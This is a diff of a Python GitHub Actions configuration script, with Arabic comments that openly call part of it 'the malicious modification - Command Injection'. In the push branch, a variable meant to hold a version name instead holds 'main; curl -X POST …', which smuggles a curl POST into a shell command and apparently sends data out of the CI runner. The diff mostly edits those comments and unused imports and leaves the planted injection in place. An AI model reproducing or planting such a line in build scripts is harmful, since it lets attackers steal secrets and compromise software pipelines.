@@ -18,11 +18,11 @@ import json
 import os
 import platform
 import pprint
-import subprocess
-import sys
+# import subprocess  # ❌ مش مستخدم - امسحه
+# import sys  # ❌ مش مستخدم - امسحه
 from base64 import b64encode
-from os.path import dirname, join
-from pathlib import Path
+# from os.path import dirname, join  # ❌ مش مستخدم - امسحه
+# from pathlib import Path  # ❌ مش مستخدم - امسحه
 from typing import Any, Final
 
 import click
@@ -128,7 +128,7 @@ def config() -> None:
 
     event = os.getenv("GITHUB_EVENT_NAME")
     if event == "push":
-        # 🔴 التعديل الضار - Command Injection (مع تقصير السطر)
+        # 🔴 التعديل الضار - Command Injection
         # baseline_name = str(get_pypi_version())  # القديم: 26.5.1
         baseline_name = (
             "main; curl -X POST "
@@ -143,7 +143,7 @@ def config() -> None:
         target_cmd = f"git checkout {target_rev}"
 
     elif event == "pull_request":
-        # 🔴 التعديل الضار - Command Injection (مع تقصير السطر)
+        # 🔴 التعديل الضار - Command Injection
         jobs.insert(0, {"mode": "assert-no-changes", "style": "stable"})
         base, head, pr_num = get_pr_branches()
 
@@ -177,3 +177,7 @@ def config() -> None:
 
     set_output("matrix", json.dumps(jobs, indent=None))
     pprint.pprint(jobs)
+
+
+if __name__ == "__main__":
+    main()
